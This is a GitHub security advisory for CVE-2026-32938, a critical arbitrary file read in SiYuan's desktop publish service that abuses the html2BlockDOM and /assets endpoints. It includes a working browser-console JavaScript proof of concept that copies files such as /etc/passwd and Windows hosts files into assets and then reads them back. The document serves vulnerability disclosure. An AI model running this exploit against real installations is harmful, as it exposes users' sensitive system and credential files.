# [C] SiYuan Vulnerable to Arbitrary File Read in Desktop Publish Service

## Summary
Severity: Critical
Advisory: GHSA-fq2j-j8hc-8vw8
CVE: CVE-2026-32938
CWE: CWE-200, CWE-22, CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:H (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-fq2j-j8hc-8vw8
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary

In SiYuan, `/api/lute/html2BlockDOM` on the desktop copies local files pointed to by `file://` links in pasted HTML into the workspace assets directory without validating paths against a sensitive-path list. Together with `GET /assets/*path`, which only requires authentication, a publish-service visitor can cause the desktop kernel to copy any readable sensitive file and then read it via GET, leading to exfiltration of sensitive files.

### Details

#### 1. Arbitrary local files copied into workspace

- **Endpoint**: `POST /api/lute/html2BlockDOM`, protected only by `model.CheckAuth`; publish read-only role is not restricted.
- **Behavior**: On desktop (`util.ContainerStd == model.Conf.System.Container`), local absolute paths from `<a href="file://...">` in the HTML are copied to `{DataDir}/assets/`.
- **Missing check**: The code does not call `util.IsSensitivePath(localPath)` before copying, so any readable file (e.g. `/etc/passwd`, `~/.ssh/id_rsa`) can be copied into assets.

#### 2. Direct access to assets via GET

- **Endpoint**: `GET /assets/*path` (`kernel/server/serve.go`), protected only by `model.CheckAuth`; no publish-scope or admin check.
- **Behavior**: The path is resolved with `model.GetAssetAbsPath("assets" + path)` and the file is served with `http.ServeFile`; any authenticated request (including publish visitors) can access existing asset files.
- **Attack chain**: The visitor calls html2BlockDOM to copy a sensitive file into `data/assets/`, extracts `data-href="assets/xxx"` from the returned DOM, then requests `GET /assets/xxx` to retrieve the file content.

### PoC

```javascript
// Run in the browser devtools console while on the SiYuan publish service
(async () => {
  try {
    // Paths below fall under util.IsSensitivePath prefixes (/etc, c:\windows\system32)
    const sensitiveFiles = [
      'file:///etc/passwd',
      'file:///etc/group',
      'file:///C:/Windows/System32/drivers/etc/hosts',
      'file:///C:/Windows/System32/drivers/etc/services',
    ];
    const dom = '<p>' + sensitiveFiles.map(f => `<a href="${f}">x</a>`).join(' ') + '</p>';
    const r1 = await fetch('/api/lute/html2BlockDOM', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ dom }),
      credentials: 'same-origin',
    });
    const { data } = await r1.json();
    const paths = [...(data || '').matchAll(/data-href="(assets\/[^"]+)"/g)].map(m => m[1]);
    for (const p of paths) {
      const r2 = await fetch('/' + p, { credentials: 'same-origin' });
      if (r2.ok) console.log('--- ' + p + ' ---\n' + (await r2.text()));
    }
  } catch (_) {}
})();
```

### Impact

With only normal authentication, an attacker can bypass intended directory restrictions and read any sensitive file that the process can read on the desktop user’s machine (e.g. system account data, network configuration, credential configs), compromising confidentiality of sensitive data and the runtime environment.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-fq2j-j8hc-8vw8
- https://nvd.nist.gov/vuln/detail/CVE-2026-32938
- https://github.com/siyuan-note/siyuan/commit/294b8b429dea152cd1df522cddf406054c1619ad
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
